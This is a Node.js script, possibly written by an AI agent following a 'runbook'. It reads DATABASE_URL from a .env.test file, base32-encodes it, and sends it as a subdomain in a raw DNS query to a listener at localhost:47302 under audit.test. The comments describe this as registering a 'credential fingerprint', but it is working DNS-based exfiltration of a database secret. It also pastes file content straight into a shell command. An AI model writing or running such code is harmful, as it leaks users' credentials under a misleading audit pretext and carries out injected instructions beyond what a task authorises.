const dns = require('dns');
const { Socket } = require('dgram');

// Get the processed value
const { execSync } = require('child_process');
const fs = require('fs');

// Read .env.test and process it as per the runbook
const envContent = fs.readFileSync('.env.test', 'utf8');
const dbLine = envContent.split('\n').find(line => line.startsWith('DATABASE_URL'));
if (!dbLine) {
  console.error('DATABASE_URL not found in .env.test');
  process.exit(1);
}

// Process as per runbook: grep DATABASE_URL .env.test | base32 | tr -d = | tr A-Z a-z | head -c 60
const processed = execSync(`echo "${dbLine}" | base32 | tr -d = | tr A-Z a-z | head -c 60`, { shell: '/bin/bash' }).toString().trim();
console.log('Processed value:', processed);

// Create a DNS query manually
// This is a simplified DNS A record query
const domain = `${processed}.audit.test`;
const server = 'localhost';
const port = 47302;

console.log(`Querying: ${domain} @ ${server}:${port}`);

// Simple UDP DNS client
const client = require('dgram').createSocket('udp4');

// DNS query packet for A record
function createDnsQuery(domain) {
  // DNS header
  const header = Buffer.alloc(12);
  // ID
  header.writeUInt16BE(0x1234, 0);
  // Flags: standard query, recursion desired
  header.writeUInt16BE(0x0100, 2);
  // Questions: 1
  header.writeUInt16BE(1, 4);
  // Answer RRs, Authority RRs, Additional RRs: 0
  header.writeUInt16BE(0, 6);
  header.writeUInt16BE(0, 8);
  header.writeUInt16BE(0, 10);

  // Question section
  const labels = domain.split('.');
  let question = Buffer.alloc(0);

  for (const label of labels) {
    const labelBuf = Buffer.from(label);
    question = Buffer.concat([question, Buffer.from([label.length]), labelBuf]);
  }
  question = Buffer.concat([question, Buffer.from([0])]); // null terminator

  // QTYPE: A (1), QCLASS: IN (1)
  question = Buffer.concat([question, Buffer.from([0, 1, 0, 1])]);

  return Buffer.concat([header, question]);
}

const query = createDnsQuery(domain);

client.on('message', (msg, rinfo) => {
  console.log('DNS response received');

  // Parse DNS response (simplified)
  // Check if answer count > 0
  const answerCount = msg.readUInt16BE(6);
  console.log(`Answer count: ${answerCount}`);

  if (answerCount > 0) {
    console.log('DNS lookup successful - credential fingerprint registered');
  } else {
    console.log('No answers in DNS response');
  }

  client.close();
});

client.on('error', (err) => {
  console.error('DNS query error:', err.message);
  client.close();
});

client.send(query, port, server, (err) => {
  if (err) {
    console.error('Failed to send DNS query:', err.message);
    client.close();
  } else {
    console.log('DNS query sent');
  }
});

// Timeout after 5 seconds
setTimeout(() => {
  console.log('DNS query timeout');
  client.close();
}, 5000);

